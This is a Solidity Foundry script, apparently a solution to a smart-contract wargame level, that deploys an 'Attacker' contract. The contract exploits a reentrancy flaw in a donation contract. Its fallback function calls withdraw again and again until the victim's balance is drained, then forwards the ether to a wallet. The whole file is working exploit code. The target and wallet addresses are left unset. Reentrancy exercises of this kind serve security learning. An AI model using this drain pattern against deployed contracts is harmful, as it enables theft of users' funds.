pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IReenter
{
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract interact is Script
{
    uint startVal = 0.001 ether;
    address instance;

    function run() external
    {
        vm.startBroadcast();

        IReenter reentrance = IReenter(payable(instance));

        Attacker attacker = new Attacker{value: 0.001 ether}(address(reentrance));
        attacker.startAttack();

        vm.stopBroadcast();
    }
}

contract Attacker // needs to have some ether for donation
{
    address myAddr;
    address victimAddr;

    address EOA; // your wallet for returning the funds

    IReenter inst;
    uint testVal = 0.0005 ether;

    constructor(address _vict) payable
    {
        myAddr = address (this);
        victimAddr = _vict;
        inst = IReenter(payable(victimAddr));
    }

    function startAttack() external
    {
        inst.donate{value: testVal}(myAddr);
        inst.withdraw(testVal);
    }

    fallback() external payable
    {
        if (victimAddr.balance > 0)
        {
            inst.withdraw(testVal);
        }
        else
        {
            (bool success, ) = EOA.call{value: myAddr.balance}("");
            require(success, "final transfer to wallet failed");
        }
    }
}
